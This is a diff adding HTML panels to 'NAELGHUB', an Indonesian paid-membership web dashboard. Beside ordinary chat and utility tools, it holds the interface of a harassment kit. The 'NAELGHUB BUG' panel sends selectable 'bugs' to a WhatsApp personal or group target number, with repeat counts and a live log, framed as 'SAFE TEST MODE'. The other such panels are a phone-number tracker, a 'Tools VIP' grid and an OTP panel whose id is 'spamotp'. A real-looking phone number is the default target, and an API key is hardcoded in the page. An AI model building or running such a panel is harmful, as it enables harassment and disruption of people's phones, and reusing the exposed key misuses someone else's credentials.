+                  <div id="nxUploadStatus" style="font-size:9px;color:rgba(255,255,255,.45);margin-top:7px">Firebase Storage diperlukan untuk upload lintas perangkat.</div>
+                </div>
+                <div class="nx-feed" id="nxSocialFeed"><div class="nx-empty">Memuat feed...</div></div>
+              </div>
+            </div>
+          </div>
+
+          <div class="nx-accordion" data-nx-acc="build">
+            <button class="nx-acc-head" type="button" onclick="navigate('noxxa')"><span><i class="fas fa-box"></i> NOXXA BUILD APK</span><b class="nx-acc-state">Buka</b><i class="fas fa-chevron-right nx-acc-chevron"></i></button>
+          </div>
+        </section>
+
+        <div class="dash-online-row">
+          <div class="dash-online-card"><div class="oc-num" id="dashOnlineNow">0</div><div class="oc-lbl">Online</div></div>
+          <div class="dash-online-card"><div class="oc-num" id="dashTotalMember">0</div><div class="oc-lbl">Member</div></div>
+          <div class="dash-online-card"><div class="oc-num" id="dashBugSent">0</div><div class="oc-lbl">Bug Sent</div></div>
+        </div>
+
+        <div class="panel-card">
+          <h3><i class="fas fa-chart-line"></i> System Status</h3>
+          <p style="color:var(--text-secondary);font-size:13px;line-height:2;">
+            <span style="color:#00e676;">●</span> WhatsApp: <span id="waStatus">Terhubung</span><br>
+            <span style="color:var(--accent);">●</span> Backend: <span id="backendStatusText">Belum dikonfigurasi</span><br>
+            <span style="color:#00e676;">●</span> Firebase: <span id="fbChatStatus">Menghubungkan...</span>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ AI CHAT ============ -->
+    <div class="panel" id="panel-aic">
+      <div class="panel-inner">
+        <div class="panel-card">
+          <h3><i class="fas fa-robot" style="color:#4285f4;"></i> AI Chat Groq <div class="ai-status"><span class="dot"></span> <span id="groqState">Ready</span></div></h3><button class="runner-btn" onclick="resetAiChat()" style="margin-left:auto;padding:7px 10px;font-size:11px;"><i class="fas fa-rotate-left"></i> Reset</button>
+          <div style="padding:12px;background:rgba(66,133,244,.06);border-radius:10px;border:1px solid rgba(74,144,217,.3);margin-bottom:12px;">
+            <div style="font-size:12px;font-weight:700;color:#8ab4f8;">🔐 AI AMAN</div>
+            <div style="font-size:11px;color:var(--text-secondary);margin-top:5px;">NAEL-AI memakai Groq <b>openai/gpt-oss-120b</b>. API key disimpan di Netlify Environment Variables, bukan di browser.</div>
+            <div id="groqSecureState" style="font-size:11px;color:#00e676;margin-top:7px;">● Server AI siap</div>
+          </div>
+          <div class="ai-chat-box">
+            <div class="ai-chat-messages" id="aiMessages">
+              <div class="ai-msg bot">
+                <div class="ai-avatar"><i class="fas fa-robot"></i></div>
+                <div class="ai-body">
+                  <div class="ai-name">NAEL-AI</div>
+                  <div class="ai-text">Halo! Saya NAEL-AI. Saya siap membantu kamu. 🤖</div>
+                </div>
+              </div>
+            </div>
+            <div class="ai-input-area">
+              <textarea id="aiInput" placeholder="Tanya apa saja..." rows="1" onkeypress="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendAiMessage();}"></textarea>
+              <button onclick="sendAiMessage()"><i class="fas fa-paper-plane"></i></button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ MULTI API ============ -->
+    <div class="panel" id="panel-apis">
+      <div class="panel-inner">
+        <div class="panel-card">
+          <h3><i class="fas fa-plug" style="color:#00e676;"></i> Multi API Tools</h3>
+          <p style="font-size:11px;color:var(--text-secondary);margin-bottom:14px;">Semua API di bawah ini <b>GRATIS</b> & <b>tanpa API Key</b>.</p>
+          <div class="api-grid">
+            <div class="api-card">
+              <h4><i class="fas fa-qrcode"></i> QR Code Generator</h4>
+              <div class="input-row">
+                <input type="text" id="qrText" placeholder="Teks atau URL..." value="https://naelghub.app" />
+                <button onclick="genQR()"><i class="fas fa-qrcode"></i> Generate</button>
+              </div>
+              <div id="qrResult" class="api-result">▶ Masukkan teks lalu klik Generate</div>
+            </div>
+            <div class="api-card">
+              <h4><i class="fas fa-link"></i> URL Shortener</h4>
+              <div class="input-row">
+                <input type="text" id="shortUrl" placeholder="https://..." value="https://github.com" />
+                <button onclick="shortenUrl()"><i class="fas fa-compress"></i> Shorten</button>
+              </div>
+              <div id="shortResult" class="api-result">▶ Masukkan URL lalu klik Shorten</div>
+            </div>
+            <div class="api-card">
+              <h4><i class="fas fa-language"></i> Translate Text</h4>
+              <div class="input-row">
+                <input type="text" id="translateText" placeholder="Text" value="Halo dunia" />
+                <select id="translateTo">
+                  <option value="en">English</option><option value="id">Indonesia</option><option value="ja">Japanese</option>
+                  <option value="ko">Korean</option><option value="ar">Arabic</option><option value="es">Spanish</option>
+                </select>
+                <button onclick="translateText()"><i class="fas fa-globe"></i></button>
+              </div>
+              <div id="translateResult" class="api-result">▶ Isi teks lalu pilih bahasa</div>
+            </div>
+            <div class="api-card">
+              <h4><i class="fas fa-money-bill-wave"></i> Currency Converter</h4>
+              <div class="input-row">
+                <input type="number" id="currAmount" placeholder="Jumlah" value="100" />
+                <select id="currFrom"><option value="USD">USD</option><option value="IDR">IDR</option><option value="EUR">EUR</option></select>
+                <select id="currTo"><option value="IDR">IDR</option><option value="USD">USD</option><option value="EUR">EUR</option></select>
+                <button onclick="convertCurrency()"><i class="fas fa-exchange-alt"></i></button>
+              </div>
+              <div id="currResult" class="api-result">▶ Masukkan jumlah lalu klik Convert</div>
+            </div>
+            <div class="api-card">
+              <h4><i class="fab fa-github"></i> GitHub User Info</h4>
+              <div class="input-row">
+                <input type="text" id="ghUser" placeholder="Username" value="torvalds" />
+                <button onclick="getGitHub()"><i class="fas fa-search"></i></button>
+              </div>
+              <div id="ghResult" class="api-result">▶ Cari user GitHub</div>
+            </div>
+            <div class="api-card">
+              <h4><i class="fas fa-user-secret"></i> Random User</h4>
+              <div class="input-row"><button onclick="getRandomUser()"><i class="fas fa-random"></i> Generate</button></div>
+              <div id="userResult" class="api-result">▶ Klik tombol untuk generate</div>
+            </div>
+            <div class="api-card">
+              <h4><i class="fas fa-laugh"></i> Random Joke</h4>
+              <div class="input-row"><button onclick="getJoke()"><i class="fas fa-smile"></i> Get Joke</button></div>
+              <div id="jokeResult" class="api-result">▶ Klik tombol untuk dapat joke</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ CHAT LIVE ============ -->
+    <div class="panel" id="panel-chat">
+      <div class="panel-inner">
+        <div class="panel-card">
+          <h3><i class="fas fa-comments" style="color:#00d4ff;"></i> Global Chat Live <span class="firebase-status connected" id="fbStatus">● Firebase</span></h3>
+          <div class="chat-container">
+            <div class="chat-messages" id="chatMessages"><div style="text-align:center;padding:20px;color:var(--text-secondary);font-size:12px;"><i class="fas fa-spinner fa-spin"></i> Memuat chat...</div></div>
+            <div class="chat-input-area">
+              <input type="text" id="chatInput" placeholder="Ketik pesan..." onkeypress="if(event.key==='Enter')sendChatMessage()" />
+              <button onclick="sendChatMessage()"><i class="fas fa-paper-plane"></i></button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ SENDER PRIVATE ============ -->
+<div class="panel" id="panel-privatechat">
+  <div class="panel-inner">
+    <div class="np-panel">
+      <div class="np-head">
+        <div class="np-icon">🔒</div>
+        <div><h2>Sender Private</h2><p>Chat pribadi antar pengguna secara realtime.</p></div>
+      </div>
+      <div class="np-status" id="privateFirebaseStatus">● Memeriksa koneksi Firebase...</div>
+      <div class="np-target">
+        <label>USERNAME TUJUAN</label>
+        <div class="np-row">
+          <input id="privateUser" type="text" placeholder="username tujuan" autocomplete="off">
+          <button type="button" onclick="openPrivateRoom()">BUKA</button>
+        </div>
+      </div>
+      <div class="np-room" id="privateRoomLabel">Belum ada room private</div>
+      <div class="np-messages" id="privateMessages"><div class="np-empty">Masukkan username lalu tekan BUKA.</div></div>
+      <div class="np-row np-send">
+        <input id="privateInput" type="text" placeholder="Tulis pesan..." onkeypress="if(event.key==='Enter')sendPrivateMessage()">
+        <button type="button" onclick="sendPrivateMessage()">KIRIM</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ WHATSAPP PAIRING ============ -->
+<div class="panel" id="panel-pairing">
+  <div class="panel-inner">
+    <div class="np-panel pairing-panel">
+      <div class="np-head">
+        <div class="np-icon">🔗</div>
+        <div><h2>WhatsApp Pairing</h2><p>Hubungkan WhatsApp dengan pairing code.</p></div>
+        <span id="pairDot2" class="pair-dot"></span>
+      </div>
+      <div class="pair-status-box" id="pairStatus2">Memeriksa backend...</div>
+      <label>Nomor WhatsApp</label>
+      <div class="np-row">
+        <input id="pairPhone2" type="tel" inputmode="numeric" placeholder="628xxxxxxxxxx" autocomplete="tel">
+        <button id="pairingBtn2" type="button" onclick="requestPairingCode2()">GET CODE</button>
+      </div>
+      <div class="pair-loader" id="pairLoader2" hidden>⏳ Meminta pairing code...</div>
+      <div class="pair-code-box" id="pairCodeBox2" hidden>
+        <small>PAIRING CODE</small>
+        <strong id="pairCode2">--------</strong>
+        <button type="button" onclick="copyPairCode2()">SALIN CODE</button>
+      </div>
+      <pre id="pairingResult2" class="pair-result"></pre>
+      <div class="pair-help">Pastikan backend Node.js aktif dan URL backend sudah dikonfigurasi.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ============ MEMBER PANEL ============ -->
+    <div class="panel" id="panel-member">
+      <div class="panel-inner">
+        <div class="panel-card nx-security-card" id="memberSecurityCard">
+          <h3><i class="fas fa-shield-halved" style="color:#ff2d68;"></i> Keamanan Member <span id="memberSecurityStatus" style="font-size:10px;color:#00e676;float:right;">● Real-time</span></h3>
+          <div style="font-size:11px;color:var(--text-secondary);margin-bottom:12px;">Kelola username dan password akunmu. Perubahan profil disinkronkan ke Firebase secara real-time.</div>
+          <div id="memberSecurityProfile" style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+            <div><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">Username sekarang</label><input id="securityCurrentUsername" type="text" readonly style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;"></div>
+            <div><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">Username baru</label><input id="securityNewUsername" type="text" autocomplete="username" placeholder="username baru" style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;"></div>
+            <div><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">Password sekarang</label><input id="securityCurrentPassword" type="password" autocomplete="current-password" placeholder="password sekarang" style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;"></div>
+            <div><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">Password baru</label><input id="securityNewPassword" type="password" autocomplete="new-password" placeholder="minimal 8 karakter" style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;"></div>
+            <div style="grid-column:1/-1"><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">Konfirmasi password baru</label><input id="securityConfirmPassword" type="password" autocomplete="new-password" placeholder="ulangi password baru" style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;"></div>
+          </div>
+          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;">
+            <button class="runner-btn" onclick="changeMemberUsername()" style="flex:1;min-width:150px;padding:11px;"><i class="fas fa-user-pen"></i> GANTI USERNAME</button>
+            <button class="runner-btn" onclick="changeMemberPassword()" style="flex:1;min-width:150px;padding:11px;"><i class="fas fa-key"></i> GANTI PASSWORD</button>
+          </div>
+          <div id="memberSecurityActivity" style="margin-top:12px;padding:10px;border-radius:10px;background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.07);font-size:10px;color:var(--text-secondary);">Aktivitas keamanan: memuat...</div>
+        </div>
+        <div class="panel-card" id="createAccessCard" style="display:none;">
+          <h3><i class="fas fa-user-plus" style="color:#00e676;"></i> Buat Akses Baru <span id="createAccessBadge" style="font-size:10px;"></span></h3>
+          <div id="createRoleGrid" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:8px;margin-bottom:14px;"></div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px;">
+            <div><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">Username</label><input type="text" id="newUserUsername" placeholder="username" style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;" /></div>
+            <div><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">Password</label><input type="password" id="newUserPassword" placeholder="password" style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;" /></div>
+            <div><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">Hari</label><input type="number" id="newUserDays" value="30" min="1" style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;" /></div>
+            <div><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">Harga</label><input type="number" id="newUserPrice" value="0" min="0" style="width:100%;padding:10px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;" /></div>
+          </div>
+          <label style="display:flex;align-items:center;gap:8px;font-size:11px;color:#fff;margin-bottom:12px;cursor:pointer;">
+            <input type="checkbox" id="newUserPermanent" onchange="togglePermanentAccess()" style="width:17px;height:17px;accent-color:#ff00ff;">
+            <span>OWNER PERMANENT — tanpa tanggal kedaluwarsa</span>
+          </label>
+          <div id="ownerPermanentNotice" style="display:none;margin-bottom:12px;padding:10px;border-radius:10px;background:rgba(255,0,255,.08);border:1px solid rgba(255,0,255,.25);font-size:10px;color:#ffd6ff;">🌸 Owner permanent hanya dapat dibuat oleh akun OWNER/DEVELOPER dari Member Panel.</div>
+          <button class="runner-btn" onclick="createNewAccess()" style="width:100%;padding:14px;font-size:14px;font-weight:700;"><i class="fas fa-rocket"></i> BUAT AKSES</button>
+        </div>
+        <div class="panel-card" id="paymentProofCard">
+          <h3><i class="fas fa-receipt" style="color:#ffd700;"></i> Bukti Pembayaran</h3>
+          <div style="font-size:11px;color:var(--text-secondary);margin-bottom:10px;">Upload SS/foto bukti pembayaran. Gambar dikompres sebelum disimpan agar lebih ringan.</div>
+          <div style="display:grid;grid-template-columns:1fr auto;gap:10px;align-items:end;">
+            <div><label style="font-size:10px;color:var(--text-secondary);display:block;margin-bottom:4px;">File bukti</label><input type="file" id="paymentProofFile" accept="image/*" onchange="previewPaymentProof(event)" style="width:100%;padding:9px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:11px;" /></div>
+            <button class="runner-btn" onclick="submitPaymentProof()" style="padding:10px 14px;"><i class="fas fa-upload"></i> KIRIM BUKTI</button>
+          </div>
+          <div id="paymentProofPreview" style="display:none;margin-top:10px;"></div>
+          <div id="paymentProofStatus" style="margin-top:10px;font-size:11px;color:var(--text-secondary);"></div>
+          <div id="paymentProofAdminList" style="margin-top:12px;"></div>
+        </div>
+        <div class="panel-card">
+          <h3><i class="fas fa-users" style="color:var(--accent);"></i> Daftar Member <span id="adminBadge" style="font-size:10px;"></span></h3>
+          <div class="member-stats-grid">
+            <div class="member-stat"><div class="icon"><i class="fas fa-users"></i></div><div class="label">Total</div><div class="value" id="memberTotal">0</div></div>
+            <div class="member-stat"><div class="icon" style="color:#00e676;"><i class="fas fa-circle"></i></div><div class="label">Online</div><div class="value" id="memberOnline">0</div></div>
+            <div class="member-stat"><div class="icon" style="color:var(--vip-color);"><i class="fas fa-crown"></i></div><div class="label">VIP</div><div class="value" id="memberVip">0</div></div>
+            <div class="member-stat"><div class="icon" style="color:var(--reseller-color);"><i class="fas fa-handshake"></i></div><div class="label">Reseller</div><div class="value" id="memberReseller">0</div></div>
+          </div>
+          <div class="member-search-bar">
+            <input type="text" id="memberSearch" placeholder="🔍 Cari..." oninput="renderMemberList()" />
+            <select id="memberFilter" onchange="renderMemberList()">
+              <option value="all">Semua</option><option value="member">Member</option><option value="vip">VIP</option>
+              <option value="reseller">Reseller</option><option value="owner">Owner</option><option value="developer">Developer</option>
+            </select>
+            <button class="runner-btn" onclick="refreshMemberList()" style="padding:8px 16px;"><i class="fas fa-sync"></i></button>
+          </div>
+          <div class="member-list" id="memberList"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ SERVER MONITOR ============ -->
+    <div class="panel" id="panel-sendbug">
+  <div class="panel-inner oldbug-panel">
+    <div class="oldbug-head">
+      <div class="oldbug-shield">🛡️</div>
+      <div class="oldbug-title">NAELGHUB BUG</div>
+    </div>
+
+    <div class="oldbug-banner">
+      <img src="spiderman.jpg" alt="SendBug background" onerror="this.style.display='none'">
+    </div>
+
+    <div class="oldbug-card">
+      <div class="oldbug-label"><span>📱</span> NOMOR TARGET</div>
+      <div class="oldbug-target-tabs">
+        <button type="button" class="oldbug-target active" data-target-type="personal" onclick="setSrvTargetType('personal')">📱 PERSONAL</button>
+        <button type="button" class="oldbug-target" data-target-type="group" onclick="setSrvTargetType('group')">👥 GRUP</button>
+      </div>
+      <input class="oldbug-input" type="text" id="srvTarget" value="6285235848455" placeholder="62xxxxxxxxxx" autocomplete="off">
+      <div id="srvTargetHint" class="oldbug-hint">Target Personal: <b>62xxxxxxxxxx</b></div>
+    </div>
+
+    <div class="oldbug-section-title">
+      <span>⚙️ PILIH BUG</span>
+      <span class="oldbug-engine">🟢 Engine aktif</span>
+    </div>
+
+    <div class="oldbug-tabs" id="srvCategoryTabs"></div>
+    <div class="oldbug-grid" id="srvBugGrid"></div>
+
+    <div class="oldbug-run-wrap">
+      <button class="oldbug-run" id="srvAttackBtn" onclick="startServerSendBug()">🕷️ RUN TEST</button>
+      <button class="oldbug-stop" id="srvStopBtn" onclick="stopServerSendBug()" style="display:none">■ STOP TEST</button>
+    </div>
+
+    <div class="oldbug-card oldbug-repeat">
+      <label>REPEAT TEST <input type="number" id="srvRepeat" min="1" max="25" value="5"></label>
+      <span>SAFE TEST MODE</span>
+    </div>
+
+    <div class="oldbug-log-title">LIVE LOG</div>
+    <div class="srv-log oldbug-log" id="srvLog"><span class="l-info">[SYS] SendBug() ready...</span></div>
+  </div>
+</div>
+
+<!-- ============ TOOLS ============ -->
+    <div class="panel" id="panel-tools">
+      <div class="panel-inner">
+        <div class="panel-card">
+          <h3><i class="fas fa-skull-crossbones" style="color:#ff1744;"></i> Tools VIP</h3>
+          <div id="toolsGrid" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:12px;"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ TRACKER ============ -->
+    <div class="panel" id="panel-tracker">
+      <div class="panel-inner">
+        <div class="panel-card">
+          <h3><i class="fas fa-search-location" style="color:#00e676;"></i> Lacak Nomor</h3>
+          <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
+            <input type="text" id="trackerInput" placeholder="628xxx" value="6285235848455" style="flex:1;min-width:140px;padding:10px 14px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:13px;outline:none;" />
+            <button class="runner-btn" onclick="trackPhoneNumber()"><i class="fas fa-search"></i></button>
+          </div>
+          <div id="trackerResult" style="display:none;margin-top:12px;padding:16px;background:rgba(0,0,0,.25);border-radius:14px;border:1px solid rgba(74,144,217,.3);"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ MUSIC ============ -->
+    <div class="panel" id="panel-music"><div class="panel-inner"><div class="panel-card"><h3><i class="fas fa-globe-americas" style="color:#00d4ff"></i> Music Worldwide</h3><div style="display:flex;gap:8px;margin-bottom:10px"><input id="musicSearch" placeholder="Cari lagu, artis, album dari seluruh dunia..." style="flex:1;padding:11px;border-radius:10px;background:#ffffff08;border:1px solid #ffffff18;color:#fff" onkeypress="if(event.key==='Enter')searchWorldwideMusic()"><button class="runner-btn" onclick="searchWorldwideMusic()"><i class="fas fa-search"></i></button></div><div style="font-size:10px;color:var(--text-secondary);margin-bottom:10px">Katalog global dicari saat dibutuhkan. Lagu lokal di folder music tetap tersedia.</div><div style="display:flex;align-items:center;gap:12px;margin-bottom:12px"><div style="width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:grid;place-items:center"><i class="fas fa-music"></i></div><div><div id="nowPlayingTitle">Pilih lagu</div><div id="nowPlayingArtist" style="font-size:11px;color:var(--text-secondary)">NAELGHUB</div></div></div><audio id="audioPlayer" preload="metadata" controls style="width:100%"></audio><div id="songList" style="display:flex;flex-direction:column;gap:5px;max-height:360px;overflow:auto;margin-top:12px"></div></div></div></div>
+    <!-- ============ SPAM OTP ============ -->
+    <div class="panel" id="panel-spamotp">
+      <div class="panel-inner">
+        <div class="panel-card">
+          <h3><i class="fas fa-shield-halved" style="color:#ffd166"></i> OTP Test Sandbox</h3>
+          <p style="font-size:11px;color:var(--text-secondary);line-height:1.5">Mode aman untuk menguji alur OTP tanpa mengirim SMS ke nomor nyata. Gunakan backend/provider sandbox milikmu untuk pengujian resmi.</p>
+          <div class="config-box" style="margin-top:12px"><label style="font-size:10px;color:var(--text-secondary)">Nomor uji</label><input type="text" id="otpTarget" placeholder="628xxxxxxxxxx" style="width:100%;margin-top:6px" /></div>
+          <button class="runner-btn" onclick="generateOtpSandbox()" style="width:100%;padding:12px;margin-top:10px"><i class="fas fa-key"></i> GENERATE OTP TEST</button>
+          <div class="srv-log" id="otpLog" style="margin-top:10px;height:120px">▶ Sandbox siap...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ HISTORY ============ -->
+    <div class="panel" id="panel-history">
+      <div class="panel-inner">
+        <div class="panel-card">
+          <h3><i class="fas fa-history"></i> History</h3>
+          <div id="historyList" style="display:flex;flex-direction:column;gap:4px;"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ SETTINGS ============ -->
+    <div class="panel" id="panel-settings">
+      <div class="panel-inner">
+        <div class="panel-card">
+          <h3><i class="fas fa-cog"></i> Settings</h3>
+          <div class="config-box">
+            <h4 style="font-size:13px;margin-bottom:8px;">Accent Color</h4>
+            <select id="accentSelect" onchange="changeAccent(this.value)" style="width:100%;padding:8px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:12px;outline:none;">
+              <option value="#ff1744">Blood Red</option><option value="#8b00ff">Purple</option><option value="#00d4ff">Blue</option><option value="#00e676">Green</option><option value="#ffd700">Gold</option>
+            </select>
+          </div>
+          <div class="config-box">
+            <h4 style="font-size:13px;margin-bottom:8px;">Bahasa</h4>
+            <select id="languageSelect" onchange="changeLanguage(this.value)" style="width:100%;padding:8px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:12px;outline:none;">
+              <option value="id">Indonesia</option><option value="en">English</option>
+            </select>
+          </div>
+          <div class="config-box">
+            <h4 style="font-size:13px;margin-bottom:8px;">Background</h4>
+            <select id="backgroundSelect" onchange="changeDashboardBackground(this.value)" style="width:100%;padding:8px 12px;border-radius:10px;border:1px solid rgba(74,144,217,.3);background:rgba(255,255,255,.04);color:#fff;font-size:12px;outline:none;">
+              <option value="normal">Normal · Video</option><option value="scary">Serem · VID-20260802</option><option value="comic">Comic / Spider Theme</option>
+            </select>
+            <div style="font-size:10px;color:var(--text-secondary);margin-top:6px">Comic memakai efek halftone + artwork yang tersedia di project.</div>
+          </div>
+          <div class="config-box">
+            <h4 style="font-size:13px;margin-bottom:8px;">Backend URL</h4>
+            <div class="config-row"><input type="text" id="settingsBackendUrl" placeholder="https://..." /><button class="runner-btn" onclick="saveBackendUrlFromSettings()"><i class="fas fa-save"></i></button></div>
+            <div id="settingsBackendStatus" style="margin-top:4px;font-size:11px;color:var(--text-secondary);"></div>
+          </div>
+          <div class="config-box">
+            <h4 style="font-size:13px;margin-bottom:8px;">Numverify API Key</h4>
+            <div class="config-row"><input type="text" id="numverifyApiKey" value="5a26c4fb4499f4f8e49464750c76d84a" /><button class="runner-btn" onclick="saveNumverifyKey()"><i class="fas fa-save"></i></button></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ ABOUT ============ -->
+    <div class="panel" id="panel-about">
+      <div class="panel-inner">
+        <div class="panel-card" style="text-align:center;">
+          <div style="font-size:60px;color:var(--accent);margin-bottom:8px;"><i class="fas fa-spider"></i></div>
+          <div style="font-size:26px;font-weight:900;background:linear-gradient(135deg,var(--accent),var(--gold),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px;">NAELGHUB</div>
+          <div style="font-size:12px;color:var(--text-secondary);margin-top:4px;">v14.1 · Split Files Edition</div>
+          <div style="font-size:10px;color:var(--text-secondary);opacity:.4;margin-top:16px;">© 2026 NAELGHUB</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <section class="panel" id="panel-noxxaweb">
+    <div class="noxxa-shell noxxa-web-shell">
+      <div class="noxxa-handle"></div>
+      <div class="noxxa-head"><div><h3>NOXXA BUILD URL/WEBSITE</h3><div class="muted" style="margin-top:5px;font-size:11px">Buat & publish website seperti workflow Netlify</div></div><span class="noxxa-step" id="noxxaWebModeBadge">WEB</span></div>
+      <div class="noxxa-section">
+        <div class="noxxa-source"><button id="noxxaWebUrlTab" class="active" onclick="setNoxxaWebSource('url')">🔗 URL / REDIRECT</button><button id="noxxaWebFolderTab" onclick="setNoxxaWebSource('folder')">📁 HTML / FOLDER</button></div>
+        <div id="noxxaWebUrlBox" class="noxxa-field"><span class="noxxa-label">URL SUMBER</span><input id="noxxaWebUrl" type="url" placeholder="https://contoh.com"><div class="noxxa-help">NOXXA membuat website baru yang mengarahkan pengunjung ke URL tersebut.</div></div>
+        <div id="noxxaWebFolderBox" class="noxxa-field noxxa-hidden"><span class="noxxa-label">UPLOAD FOLDER WEBSITE</span><input id="noxxaWebFolder" type="file" webkitdirectory directory multiple accept=".html,.htm,.css,.js,.json,.png,.jpg,.jpeg,.gif,.svg,.webp,.ico,.mp3,.mp4,.woff,.woff2,.txt,.xml"><div class="noxxa-help">Folder harus memiliki <b>index.html</b>. Maksimum ZIP 4.5 MB untuk dikirim melalui Function.</div></div>
+        <div class="noxxa-grid2 equal">
+          <div class="noxxa-field"><span class="noxxa-label">NAMA WEBSITE / SUBDOMAIN</span><input id="noxxaWebName" value="noxxa-site" maxlength="48" placeholder="noxxa-site"></div>
+          <div class="noxxa-field"><span class="noxxa-label">JUDUL WEBSITE</span><input id="noxxaWebTitle" value="NOXXA Website" maxlength="80"></div>
+        </div>
+        <div class="noxxa-field"><span class="noxxa-label">DESKRIPSI</span><input id="noxxaWebDescription" value="Website dibuat dengan NOXXA" maxlength="160"></div>
+        <div class="noxxa-actions"><button class="noxxa-btn" onclick="navigate('dashboard')">← KEMBALI</button><button class="noxxa-btn primary" onclick="deployNoxxaWebsite()">🚀 PUBLISH WEBSITE</button></div>
+        <div id="noxxaWebStatus" class="noxxa-status">Siap. Pilih URL atau upload folder HTML.</div>
+        <div id="noxxaWebProgress" class="noxxa-progress-wrap" style="display:none"><div class="noxxa-progress-top"><span id="noxxaWebProgressLabel">Menyiapkan...</span><b id="noxxaWebProgressPct">0%</b></div><div class="noxxa-progress"><i id="noxxaWebProgressBar"></i></div><div id="noxxaWebProgressStage" class="noxxa-help"></div></div>
+        <div id="noxxaWebResult" style="display:none;margin-top:14px;padding:14px;border-radius:16px;background:rgba(0,230,118,.07);border:1px solid rgba(0,230,118,.22)"></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="panel" id="panel-noxxa">
+    <div class="noxxa-shell">
+      <div class="noxxa-handle"></div>
+      <div class="noxxa-head"><div><h3>NOXXA BUILD APK</h3><div class="muted" style="margin-top:5px;font-size:11px">Web / HTML → Android WebView Project</div></div><span class="noxxa-step" id="noxxaStepBadge">1/2</span></div>
+
+      <div id="noxxaStep1" class="noxxa-section">
+        <span class="noxxa-label">SCREEN PREVIEW</span>
+        <div class="noxxa-preview">
+          <div class="noxxa-phone">
+            <div class="noxxa-statusbar"><span>12:00</span><span>⌁ 5G &nbsp;▮</span></div>
+            <div class="noxxa-urlbar"><span>🔒</span><div class="noxxa-urlpill" id="noxxaPreviewUrl">Masukkan URL...</div><span>↻</span></div>
+            <div class="noxxa-web"><iframe id="noxxaPreviewFrame" title="Preview URL" style="display:none;width:100%;height:100%;border:0;background:#fff"></iframe><div id="noxxaPreviewFallback" style="text-align:center"><strong>NOXXA</strong><small id="noxxaPreviewText">Website preview</small></div></div>
+          </div>
+        </div>
+
+        <div class="noxxa-source"><button id="noxxaUrlTab" class="active" onclick="setNoxxaSource('url')">🔗 URL Web</button><button id="noxxaHtmlTab" onclick="setNoxxaSource('html')">&lt;/&gt; Code HTML</button></div>
+        <div id="noxxaUrlBox" class="noxxa-field"><span class="noxxa-label">URL TAMPILAN (WEB / LANDING PAGE)</span><input id="noxxaUrl" type="url" value="" placeholder="https://contoh.com" oninput="updateNoxxaPreview()"></div>
